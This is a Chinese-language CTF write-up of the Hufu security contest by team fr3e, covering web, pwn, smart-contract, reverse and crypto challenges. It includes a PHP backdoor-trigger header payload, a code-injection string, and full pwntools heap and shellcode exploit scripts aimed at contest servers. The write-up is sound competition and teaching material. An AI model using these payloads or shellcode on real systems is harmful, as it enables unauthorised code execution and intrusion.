# 虎符网络安全技能大赛wp By fr3e

阅读量 **191830**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-04-14 10:30:19

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01af826e5e8b5938a8.png)

大家好，我是fr3e战队队长[now4yreal](https://github.com/now4yreal)，上周和好ji友们还有学弟学妹们一起玩了虎符的比赛，赛题质量很高，给主办方点赞。

最后排名第四，给前面三支队伍还有天枢、redbud、0ops等战队的各位大佬倒茶，大佬们太强了。战队内的学弟们（init、dem0、4ndy等等）还有好ji友[wi1l](https://github.com/Wi1L-Y)太强了，我全程躺，感谢大家陪我玩。

在这里公开wp，希望和大佬们交流 （整理仓促，大佬们轻喷，有问题联系我 （逃 :p

## web1||solved

User-Agentt: zerodiumsystem(‘cat /flag’); Connection: close

## web2||solved

直接穿这个a，闭合。ENV%0a);phpinfo();%0aecho(1

## pwn1 apollo || Solved

思路  
首先走地图溢出导致可以越界写到最先申请的heap 的
size，之后多次调用函数修改size到0x81,可以overlap,之后利用tcache实现任意地址读写，最后打free_hook

    
    
    exp
    # _*_ coding:utf-8 _*_
    from pwn import *
    context.log_level = 'debug'
    context.terminal=['tmux', 'splitw', '-h']
    # prog = 'start.sh'
    #elf = ELF(prog)
    # p = process(["qemu-aarch64","-g","1234","-L",".","./apollo"])#,env={"LD_PRELOAD":"./libc-2.27.so"})
    # libc = ELF("./libc-2.27.so")
    p = remote("8.140.179.11", 13422)
    # p = process(["qemu-aarch64","-L",".","./apollo"])#,env={"LD_PRELOAD":"./libc-2.27.so"})
    
    def debug(addr,PIE=True): 
        debug_str = ""
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
            for i in addr:
                debug_str+='b *{}\n'.format(hex(text_base+i))
            gdb.attach(p,debug_str) 
        else:
            for i in addr:
                debug_str+='b *{}\n'.format(hex(text_base+i))
            gdb.attach(p,debug_str) 
    
    def dbg():
        gdb.attach(p)
    #-----------------------------------------------------------------------------------------    s       = lambda data               :p.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
    sl      = lambda data               :p.sendline(str(data)) 
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    it      = lambda                    :p.interactive()
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    bp      = lambda bkp                :pdbg.bp(bkp)
    li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))
    
    
    def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")
    
    def lg(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    
    sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
    #https://www.exploit-db.com/shellcodes
    #-----------------------------------------------------------------------------------------    
    
    
    
    
    def exp():
        # raw_input()
        # debug([0x4000002510,0])
        ru("cmd> ")#qword_14078
        # raw_input()
    
        cmd = ""
    #-----------------------------calloc and set
        cmd += "\x4d"
        cmd += "\x10\x10"  #0x90 0x88 都分配0x100
        # cmd+= "\x4d"
    #---------------------------- add 18 heap 
        cmd+= "\x2a\x01\x04"#idx
        cmd+= "\x10\x00"#size = 0x60
        # cmd += add(cmd,0,0x60)
    
        cmd+= "\x2a\x01\x05"#idx
        cmd+= "\x20\x00"#size = 0x60
        # cmd += add(cmd,0,0x60)
    
        cmd+= "\x2a\x01\x06"#idx
        cmd+= "\x20\x00"#size = 0x60
        # cmd += add(cmd,0,0x60)
    
        cmd+= "\x2a\x01\x07"#idx
        cmd+= "\x20\x00"#size = 0x60
        # cmd += add(cmd,0,0x60)
    
    #---------------------------- add 1 heap 
        # cmd += add(cmd,1,0x60)
        cmd+= "\x2a\x00\x01"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
    #---------------------------- add 3 heap 
        # cmd += add(cmd,1,0x60)
        cmd+= "\x2a\x00\x03"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
    #---------------------------- add 5 heap 
        # cmd += add(cmd,1,0x60)
        cmd+= "\x2a\x00\x05"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
    # #---------------------------- add 7 heap 
    #     # cmd += add(cmd,1,0x60)
        cmd+= "\x2a\x00\x07"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
    # #---------------------------- add 9 heap 
    #     # cmd += add(cmd,1,0x60)
    #     cmd+= "\x2a\x00\x09"#idx
    #     cmd+= "\x10\x00"#size = 0x60    
    
    #     #---------------------------- add b heap 
    #     # cmd += add(cmd,1,0x60)
    #     cmd+= "\x2a\x00\x0b"#idx
    #     cmd+= "\x10\x00"#size = 0x60    
    
    
    #     #---------------------------- add d heap 
    #     # cmd += add(cmd,1,0x60)
    #     cmd+= "\x2a\x00\x0d"#idx
    #     cmd+= "\x10\x00"#size = 0x60    
    
    
    
        #---------------------------- add 
        # cmd += add(cmd,1,0x60)
        cmd+= "\x2a\x01\x08"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
        cmd+= "\x2a\x03\x08"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
        cmd+= "\x2a\x05\x08"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
        cmd+= "\x2a\x07\x08"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
        cmd+= "\x2a\x09\x08"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
        cmd+= "\x2a\x0b\x08"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
        cmd+= "\x2a\x0d\x08"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
        cmd+= "\x2a\x0f\x08"#idx
        cmd+= "\x10\x00"#size = 0x60    
    
    
    
    
    
    
    
    
    
    
    #-----------------------------delete 
        cmd+="\x2f\x00\x01"
        cmd+="\x2f\x00\x03"
        cmd+="\x2f\x00\x05"
        cmd+="\x2f\x00\x07"
        # cmd+="\x2f\x00\x09"
        # cmd+="\x2f\x00\x0b"
        # cmd+="\x2f\x00\x0d"
    
        cmd+="\x2f\x01\x08"
        cmd+="\x2f\x03\x08"
        cmd+="\x2f\x05\x08"
        cmd+="\x2f\x07\x08"
        cmd+="\x2f\x09\x08"
        cmd+="\x2f\x0b\x08"
        cmd+="\x2f\x0d\x08"
        cmd+="\x2f\x0f\x08"
    
    #     # cmd+="\x2f\x00\x01"
    
    # #-----------------------------set flag
        cmd +="\x2b\x00\x01\x03" #idx 1
        cmd +="\x2b\x00\x03\x03" # idx 3
        cmd +="\x2b\x00\x05\x03" # idx 5
        cmd +="\x2b\x00\x07\x03" # idx 7
        # cmd +="\x2b\x00\x09\x03" # idx 9
        # cmd +="\x2b\x00\x0b\x03" # idx b
        # cmd +="\x2b\x00\x0d\x03" # idx d
    
    
        cmd +="\x2b\x01\x08\x03" # 
        cmd +="\x2b\x03\x08\x03" # 
        cmd +="\x2b\x05\x08\x03" # 
        cmd +="\x2b\x07\x08\x03" # 
        cmd +="\x2b\x09\x08\x03" # 
        cmd +="\x2b\x0b\x08\x03" # 
        cmd +="\x2b\x0d\x08\x03" # 
        cmd +="\x2b\x0f\x08\x03" # 
    
    
    
    
        for i in range(4):
            cmd+="\x64"
    
        for i in range(0x81-4+1):
            cmd += "\x73" 
    
        # cmd += "\x73" 
    
    #--------------------------------------ovlap ok
    
    
        # cmd+= "\x2a\x01\x05"#idx
        # cmd+= "\x20\x00"#size = 0x60
        # # cmd += add(cmd,0,0x60)
    
        cmd+="\x2f\x01\x05"  # delete heap do2
        cmd+="\x2f\x01\x04"  # delete heap do1
    
        cmd+= "\x2a\x01\x04"#idx
        cmd+= "\x70\x00"#
    #--------------------------------------leak
        cmd+= "\x2a\x01\x09"#idx
        cmd+= "\x20\x00"#
    
    
        cmd+= "\x2a\x01\x0a"#idx
        cmd+= "\x20\x00"#
    
    
    # # #--------------------------- 1620
        # cmd+= '\x70'
        # cmd+="\x2f\x01\x0a"  # delete heap do1
    
        # cmd += "\x61" 
        cmd+= '\x70'
    
        cmd+="\x2f\x01\x09" 
    
    
    
        s(cmd)
        for i in range(8):
            sleep(0.5)
            s('/bin/sh\x00')
        for i in range(8):
            sleep(0.5)
            s('/bin/sh\x00')
        # sleep(0.5)
        # s()
    
        # for i in range(8):#0x00000040009b3630   0x4000013EF0
        pay = 0x10*'d'+p64(0)+p64(0x31)+p64(0x00000040009b3630-0x18000)
        sleep(0.5)#0x40008bc790
        s(pay)
        sys = 0x40008bc128  - 0x77128 + 0x3f2c8
        # sys = 0x000000400085d000+0x4f550 #0x40008bc128
        for i in range(1):
            sleep(0.5)
            s('/bin/sh\x00')
        sleep(0.5)
        lg('sys',sys)
        s(p64(sys))
        # s('a')
    
        # ru("pos:1,10\x0a")
        # data = r(3)
        # data = uu64(data+'\x00\x40')
        # lg('data',data)
    
    
    # c0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
    # constraints:
    #   rcx == NULL
    
    # 0x4f432 execve("/bin/sh", rsp+0x40, environ)
    # constraints:
    #   [rsp+0x40] == NULL
    
    # 0x10a41c execve("/bin/sh", rsp+0x70, environ)
    # constraints:
    #   [rsp+0x70] == NULL
    
    
    #x/30gx 0x4000014078
    # x/30gx 0x4000014010
    # x/20gx 0x00000040008149b0
    # x/10gx x/20gx 0x4000014088
    
        it()
    if __name__ == '__main__':
        exp()
    # 0x2a 1018 add
    # 0x2b 1394 set_flag
    # 0x2d 14D4 
    # 0x2f 11f4 delete
    # 0x64 2080 
    # 0x61 1D10
    # 0x77 1620
    # 0x73 1990
    # 0x4d eb8
    # 0x70 show
    

## pwn2 AGame_给转账 | solved

很简单的一道智能合约题，先调用root声明owner，在调用0xb8b8d35a方法即可

![](https://p2.ssl.qhimg.com/t01f9d3c6887e7d989a.png)

交互合约如下

![](https://p1.ssl.qhimg.com/t01f34a5d9432ed6031.png)

完成交互后提交自己的合约地址即可

## pwn3 SafeContract | solved

简单的数字溢出，随意发送任意数量ether调用despiot都可导致该溢出

![](https://p2.ssl.qhimg.com/t01401f8067ecb57580.png)

交互合约如下

![](https://p4.ssl.qhimg.com/t015a345d789b643872.png)

完成交互后提交自己的合约地址即可

## pwn4 quiet || solved

vm题，有一处mmap地址执行，利用getc往那个地方写shellcode，然后执行即可

    
    
    from pwn import *
    
    p = remote('8.140.179.11', 51322)
    
    
    #p = process(["qemu-aarch64","-g","1234","-L","/usr/aarch64-linux-gnu","./quiet"])#,env={"LD_PRELOAD":"./libc-2.27.so"})
    
    #-----------------------------------------------------------------------------------------    s       = lambda data               :p.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :p.sendafter(str(delim), str(data)) 
    sl      = lambda data               :p.sendline(str(data)) 
    sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :p.recv(numb)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    it      = lambda                    :p.interactive()
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))
    bp      = lambda bkp                :pdbg.bp(bkp)
    sym     = lambda symbol             :pdbg.sym(symbol)
    
    #elf=ELF("/lib/x86_64-linux-gnu/libc.so.6") # /lib/x86_64-linux-gnu/libc.so.6 /lib/i386-linux-gnu/libc.so.6
    #libc=ELF("")
    sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    sh_x64_21="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
    #https://www.exploit-db.com/shellcodes
    #-----------------------------------------------------------------------------------------    shellcode="\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"+"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"+"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
    pay=(chr(35)+chr(41))*len(shellcode)+chr(71)
    
    sla('cmd> ',pay)
    sleep(1)
    sl(shellcode)
    '''
    for i in range(len(shellcode)):
        sl(shellcode[i])
        sleep(0.1)
    '''
    it()
    

## misc1 | | solved

查看日志，发现从1547行开始爆破flag

![](https://p0.ssl.qhimg.com/t017cc85c415bb6c4da.png)

爆破成功时会sleep 2秒

![](https://p1.ssl.qhimg.com/t0161a825571d1ffed5.png)

根据这一点写脚本提取flag

![](https://p1.ssl.qhimg.com/t011e0f49a66b84fd77.png)

得到

![](https://p5.ssl.qhimg.com/t01e10c294e2ac04f7e.png)

解密得到

![](https://p3.ssl.qhimg.com/t013a9586e06eeb8550.png)

## re1 redemption_code | | solved

题目的 python 翻译版本长这样滴：

    
    
    def check(target, inp):
        inputLen = len(inp)
        targetLen = len(target)
        test = [0] * (inputLen << 10)
        test[inp[0]] = 1
    
        tmp = 0
        for i in range(inputLen):
            for j in range(256):
                if j != inp[i]:
                    test[256 * i + j] = test[256 * tmp + j]
                else:
                    test[256 * i + j] = i + 1
            tmp = test[256 * tmp + inp[i]]
    
        tmp2 = 0
        for k in range(targetLen):
            tmp2 = test[256 * tmp2 + target[k]]
            if tmp2 == inputLen:
                return k - inputLen + 1
        return -1
    
    def pre(inp):
        target1 = "Ninja Must Die 3 Is A Cruel Game, So Hard For Me"
        if check(target1, inp) == -1:
            exit(-2)
    
    inp = "x" * 0xE
    
    pre(inp)
    
    target2 = "I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative."
    if check(target2, inp) == 7:
        print "flag{%s}" % inp
    

flag 就是第二个句子偏移 7 的 14 个字符 Ninja Must Die

re2 GoEncrypt | | solved  
输入的 flag 要满足正则：  
^flag{([0-9a-f]{8})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{12})}$

类似 flag{aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee}，然后取出关键部分拼接
aaaaaaaabbbbccccddddeeeeeeeeeeee，hexdecode 得到 16 个字节，前 8 和 后 8 分别用 tea 加密，密钥是
03 02 01 00 07 06 05 04 0B 0A 09 08 0F 0E 0D 0C  
由于是乱改的 tea，所以倒过来照抄，写个脚本解密

    
    
    #include <Windows.h>
    #include <iostream>
    using namespace std;
    
    void decode(size_t *cipher, size_t *plain)
    {
        int idx = 0;
        size_t v19, v24, v26, v27, a1, v22;
        size_t low_dword = cipher[0];
        size_t high_dword = cipher[1];
        size_t key[] = { 0x00010203, 0x04050607, 0x08090A0B, 0x0C0D0E0F };
    
        v22 = 0x12345678 * 32;
        while (idx < 32)
        {
            v22 -= 0x12345678;
            v24 = low_dword;
            v26 = v24 + ((v24 >> 5) ^ 16 * v24);
            v27 = ((v22 + 0x12345678) >> 11) & 3;
            a1 = v26 ^ (v22 + key[v27] + 0x12345678);
            high_dword = high_dword - a1;
            v19 = high_dword + ((high_dword >> 5) ^ 16 * high_dword);
            low_dword = v24 - (v19 ^ (v22 + key[v22 & 3]));
            idx++;
        }
        plain[0] = low_dword;
        plain[1] = high_dword;
    }
    int main() {
        size_t plain[4];
        size_t cipher[]{ 0x0EC311F0, 0x45C79AF3, 0xEDF5D910, 0x542702CB };
        decode(cipher, plain);
        decode(cipher + 2, plain + 2);
        for (size_t i = 0; i < 4; i++)
        {
            cout << hex << plain[i];
        }
        return 0;
    }
    
    得到 3bbcf9ea29184fee8a2e201b47dfcb4e，按照正则的要求修改格式即可
    
    crypto1 |  | solved
    from math import gcd
    from functools import reduce
    E=EllipticCurve([0,213,0,288,0])
    p=E((-200,680))
    q=E((-200,680))
    cnt=0
    r=[]
    while 1:
        q=q+p
        x,y=q[0],q[1]
        a=(72-x+y)/(72-18*x)
        if(a<0):
            continue
        b=(72-x-y)/(72-18*x)
        if(b<0):
            continue
        c=(-36-8*x)/(36-9*x)
        if(c<0):
            continue
        p1,q1=a.as_integer_ratio()
        p2,q2=b.as_integer_ratio()
        p3,q3=c.as_integer_ratio()
        A=p1*q2*q3
        B=p2*q1*q3
        C=p3*q1*q2
        #print(A^3+B^3+C^3==5*(A^2*B+A*B^2+A^2*C+A*C^2+B^2*C+B*C^2)+9*A*B*C)
    
        t=reduce(gcd, [A,B,C])
    
        r.append((A//t,B//t,C//t))
        cnt+=1
        print("ok")
        if(cnt==6):
            break
    print(r)
    

用变换把方程转换为椭圆曲线，然后用生成元的倍数去试，检查解出来的a,b,c是不是为正数即可，然后通分化简为整数

## crypto2 | | solved

    
    
    n1=90491363059261404858550634231628058963249510634056675949243050070342967726901705474014306927602327030350384724177110635460575819174999690119596483244243479600712538918767265671875210900320134535674577409813015049083534046496520463201426519076941111176300156840093523729587718662300148396809204630544859119149
    e1=168885479631267618895786982845222604163453078896291533672682347591744598107689212526033974774513653433252346257997820414442658988591213688157626171903932299809982342730274878146639873845642550557892032102862465267830686337683681811035549767605127670639313526152274657121913611059493817170297018143021110779877
    n2=95095659207029012582441281486144446868010823436167102942651286702532916783769809925573460637458450988006229579100306132641666284428903268946094064959939187731480872200371279589619799501099719647308276024427981251602812835714397316315251516049360167072367461142715945513735666944539297649274039644651643860709
    e2=803083831363140689387491043859995397264097623843277450416122235772461812328647926123252685647971839611777215549762999753046866799101827482369517811418620191075968232200493026341022069951100818193450315629944185492666858982140493791542156525823304188919134830223972206436313384674434426205057120372785617239573
    n3=79783914666941430193016422767234758486269300813425360037124961732818657481292239838325070399038041076030925132009832656732232485316489140378503241203611852385887657171830207427052240486122880429096750734201402521125250313116205524437146696335787282704143922449422332849550092832299254353363532151938268614467
    e3=684492483256695788393129421198297524550481983825005067209597057774764109623746650728270481031194051696472334243263072636994984124025741021144411447925322543452713770032130935145684958475930669835466496158115635503193348699515511486332577820479935984969535141042375968326457182345240372145420230964104483785721
    M=int(sqrt(max(n1,n2,n3)))
    A=Matrix([[M,e1 ,e2 , e3],
              [0,-n1,0  , 0],
              [0,0  ,-n2, 0],
              [0,0  ,0,  -n3]])
    r=A.LLL()[0]
    t=6448620018588099396425434204075361085979505748421825391542928414037428401295999009398540542847674486590236258924166930776729142654822781998610732637074093747573878661308426284101993788074712212468655888538506429550109526389221508968338088792276719947679295618317170761
    x=t//M
    y1=(e1*x-r[1])//n1
    y2=(e2*x-r[2])//n2
    y3=(e3*x-r[3])//n3
    R=[]
    R.append([x,y1])
    R.append([x,y2])
    R.append([x,y3])
    print(R)
    

因为共用x，用格很容易求解，同时也可以接出来y

    
    
    masked_flag =  10629883656219490982178951599484437698263214790268091560719514148215968944141123323489358824379735126966804354267426040231682908197526817342035901781691470
    ciphertexts =  [{'n': 90491363059261404858550634231628058963249510634056675949243050070342967726901705474014306927602327030350384724177110635460575819174999690119596483244243479600712538918767265671875210900320134535674577409813015049083534046496520463201426519076941111176300156840093523729587718662300148396809204630544859119149, 'e': 168885479631267618895786982845222604163453078896291533672682347591744598107689212526033974774513653433252346257997820414442658988591213688157626171903932299809982342730274878146639873845642550557892032102862465267830686337683681811035549767605127670639313526152274657121913611059493817170297018143021110779877, 'c': (0, 90491363059261404858550634231628058963249510634056675949243050070342967726901705474014306927602327030350384724177110635460575819174999690119596483244243469196198986120292668239952402666838171832151959642809949669793954518190032439693973116745657766490465383207136884797416616202864323502381586901806453928514), 'hint': 25663983998278288319474560705}, {'n': 95095659207029012582441281486144446868010823436167102942651286702532916783769809925573460637458450988006229579100306132641666284428903268946094064959939187731480872200371279589619799501099719647308276024427981251602812835714397316315251516049360167072367461142715945513735666944539297649274039644651643860709, 'e': 803083831363140689387491043859995397264097623843277450416122235772461812328647926123252685647971839611777215549762999753046866799101827482369517811418620191075968232200493026341022069951100818193450315629944185492666858982140493791542156525823304188919134830223972206436313384674434426205057120372785617239573, 'c': (0, 95095659207029012582441281486144446868010823436167102942651286702532916783769809925573460637458450988006229579100306132641666284428903268946094064959939176080644834649736585931140833237424823927852722577715067469685760622261935834373569238657224079294882287377105449565799679890984772111495083088228691564783), 'hint': 47787248251787907615149478523}, {'n': 79783914666941430193016422767234758486269300813425360037124961732818657481292239838325070399038041076030925132009832656732232485316489140378503241203611852385887657171830207427052240486122880429096750734201402521125250313116205524437146696335787282704143922449422332849550092832299254353363532151938268614467, 'e': 684492483256695788393129421198297524550481983825005067209597057774764109623746650728270481031194051696472334243263072636994984124025741021144411447925322543452713770032130935145684958475930669835466496158115635503193348699515511486332577820479935984969535141042375968326457182345240372145420230964104483785721, 'c': (73041862154157371674229064670550888409216140053451529283374004436651536110734376938918521442316738516203639268463111472485680083502732108867931825491194808519825096059573881206695909907258008432595237281363578731293669489033897367074393143363419088244861083645807156213390581687771017186306856077620367500647, 77837817707573379707151623790394892748771598114914937592003582442426802996364758601494359727747880510291001949424184772858956540706002999451105625873493875954677023151702166989487010859391554750093501077015364319622792488092868684171640035107565651570183298377905027193006475189322440398876152882180702841119), 'hint': 6902140684527896190268467067}]
    
    masks = []
    r=[[661281602633708663826486920028427898009447098405701242291443669957936453059596989424786500921975783032016279781143, 1234160442019081205971633839080171591517296670682179517951651316669120445932747593240541724314677115317356928552223], [661281602633708663826486920028427898009447098405701242291443669957936453059596989424786500921975783032016279781143, 5584530014107972751790443286838215319435330117138078723753388886031684850098305720586321389113525873796692845334453], [661281602633708663826486920028427898009447098405701242291443669957936453059596989424786500921975783032016279781143, 5673352682784161640574325568051734030879350274946435727408336124736359465461431142246637344016863104357076555679503]]
    cnt=0
    for ct in ciphertexts:
        c, n, e, hint = ct['c'], ct['n'], ct['e'], ct['hint']
        #x, y = recover_x_and_y(e, n)
        x,y=r[cnt]
        cnt+=1
        p_plus_q_approx = (x*e + x)//y - 1 - n
        p_approx = (p_plus_q_approx + isqrt(p_plus_q_approx^2 - 4 * n)) // 2
        p_top =  p_approx >> 312
        P.<x> = PolynomialRing(Zmod(n), implementation='NTL')
        f = 2^312 * p_top + 2^96 * x + hint
        f = f.monic()
        delta = f.small_roots(X=2^216, beta=0.5, epsilon=0.05)[0]
        p = int(2^312 * p_top + 2^96 * delta + hint)
        q = n//p
        d = inverse_mod(e, (p+1)*(q+1))
        masks.append(decrypt(c, d, n))
    
    flag = reduce(lambda a, b: a ^^ b, masks, masked_flag)
    print(bytes.fromhex(hex(flag)[2:]).decode())
    

求出x,y后，后面确定下来p的高位和低位，只有中间位不知道，用coppersmith即可  
后面的正常解密出flag

## 结语

我目前主攻二进制方向，windows kernel，linux
kernel，v8，jsc，qemu，vmware逃逸都玩，但都很菜，现在主要精力在fuzz工具的研究上。我喜欢交朋友，我的[github](https://github.com/now4yreal)会分享一些ctf好的题目以及研究的一些小玩意和cve分析repo，欢迎大家加我交流。

另外fr3e主力pwn手[wi1l](https://github.com/Wi1L-Y)大佬目前主攻浏览器安全以及blabla，属于全能选手，欢迎大家follow～

live long and pwn，祝大家玩的开心。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **now4yreal** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/237899](/post/id/237899)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [虎符](/tag/虎符)

 **+1** __7赞

 __收藏

![](https://p1.ssl.qhimg.com/t01cd13bd088f6fdd19.png) now4yreal

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

